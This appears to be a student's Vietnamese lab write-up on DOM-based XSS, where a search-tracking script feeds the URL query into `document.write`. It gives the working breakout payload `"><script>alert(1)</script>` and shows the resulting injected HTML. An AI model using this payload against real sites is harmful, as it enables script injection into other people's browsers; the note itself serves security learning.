![[dom-documentwrite.png]]
lab DOM search tracking, source từ URL, sink là document.write.

> [!NOTE] phân tích đề
> - đề cho search query tracking.
> - JS lấy `location.search` -> cho vào `document.write`.
> - server không phản chiếu gì cả, tất cả chạy ở browser.
> - nên mình phải xem tab Elements chứ đừng View Source.
> - đọc thêm [[lys thuyet XSS]] + [[DOM based Xss]].

### hướng giải
- [ ] nhập `x7Kp92Qa` vào search -> xem URL `?search=x7Kp92Qa`.
- [ ] mở DevTools -> Elements -> tìm chuỗi đó trong DOM.
- [ ] đọc JS -> xác nhận `document.write("<img src=...searchTerms=INPUT...>")`.
- [ ] thoát `">` rồi chèn script.

### giải
request (mở URL này là ăn):
```text
/?search="><script>alert(1)</script>
```

payload:
```html
"><script>alert(1)</script>
```

JS trước khi chèn:
```js
document.write('<img src="/resources/images/tracker.gif?searchTerms=' + query + '">');
```

JS sau khi chèn:
```html
<img src="/resources/images/tracker.gif?searchTerms=">
<script>alert(1)</script>
">
```

kết quả:
-> alert(1) hiện.
![[dom-documentwrite-result.png]]

> [!NOTE] bài học
> - sau khi quan sát lab này mình thấy... `document.write` là sink chạy thẳng HTML.
> -> nên mình với sink này cứ đóng attribute + đóng thẻ cũ là chèn được script.
